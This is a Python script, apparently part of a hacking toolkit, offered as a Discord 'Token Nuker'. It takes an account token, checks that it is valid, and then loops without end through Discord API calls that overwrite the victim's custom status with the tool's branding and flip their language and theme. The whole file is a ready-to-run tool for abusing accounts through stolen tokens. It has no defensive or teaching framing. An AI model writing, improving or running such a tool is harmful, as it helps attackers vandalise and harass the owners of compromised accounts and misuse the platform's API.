import os
import requests
import random
import time
from itertools import cycle

menu = """
        ▄▄▄█████▓ ▒█████   ██ ▄█▀▓█████  ███▄    █     ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███
        ▓  ██▒ ▓▒▒██▒  ██▒ ██▄█▒ ▓█   ▀  ██ ▀█   █     ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
        ▒ ▓██░ ▒░▒██░  ██▒▓███▄░ ▒███   ▓██  ▀█ ██▒   ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
        ░ ▓██▓ ░ ▒██   ██░▓██ █▄ ▒▓█  ▄ ▓██▒  ▐▌██▒   ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄
          ▒██▒ ░ ░ ████▓▒░▒██▒ █▄░▒████▒▒██░   ▓██░   ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
          ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒░   ▒ ▒    ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
           ░      ░ ▒ ▒░ ░ ░▒ ▒░ ░ ░  ░░ ░░   ░ ▒░   ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
          ░      ░ ░ ░ ▒  ░ ░░ ░    ░      ░   ░ ░       ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░
                     ░ ░  ░  ░      ░  ░         ░             ░    ░     ░  ░      ░  ░   ░
                             >>  0 N Y X   T O K E N N U K E R <<
"""
menu2 = """
     ┌───────────────────────────┐
     │   TokenNuker Options      │
     └───────────────────────────┘

  [0] ► Back to Menu
  [1] ► Token Nuker
"""

def show_menu():
    print(f"\033[32m{menu}")
    print(f"{menu2}\033[32m")

def token_nuker(token):
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    response = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if response.status_code != 200:
        print("\033[32m[!] Invalid Token\033[0m")
        return

    default_status = f"0nyx.dll Tools >>"
    modes = cycle(["light", "dark"])

    while True:
        CustomStatus_default = {"custom_status": {"text": default_status}}
        try:
            requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=CustomStatus_default)
            print(f"\033[32m[!] Status Changed to {default_status}\033[0m")
        except Exception as e:
            print(f"\033[32m[!] Error: {e}\033[0m")

        for _ in range(5):
            try:
                random_language = random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'el', 'cs'])
                setting = {'locale': random_language}
                requests.patch("https://discord.com/api/v7/users/@me/settings", headers=headers, json=setting)
                print(f"\033[32m[!] Language Changed to {random_language}\033[0m")
            except Exception as e:
                print(f"\033[32m[!] Error: {e}\033[0m")
        
            try:
                theme = next(modes)
                setting = {'theme': theme}
                requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
                print(f"\033[32m[!] Theme Changed to {theme}\033[0m")
            except Exception as e:
                print(f"\033[32m[!] Error: {e}\033[0m")
            time.sleep(0.5)

def main():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        show_menu()
        try:
            choice = int(input('\033[32m> Select an option: \033[0m'))
            if choice == 0:
                os.system('python cyb3rtech.py')
                break
            elif choice == 1:
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f"\033[32m{menu}")
                token_discord = input('\033[32mToken >> \033[0m')
                token_nuker(token_discord)
            else:
                print("\033[32m[!] > Invalid choice < [!]\033[0m")
        except ValueError:
                print("\033[32m[!] Please enter a valid number\033[0m")
        input("\n\033[32mPress Enter to return to the main menu...\033[0m")

if __name__ == "__main__":
    main()
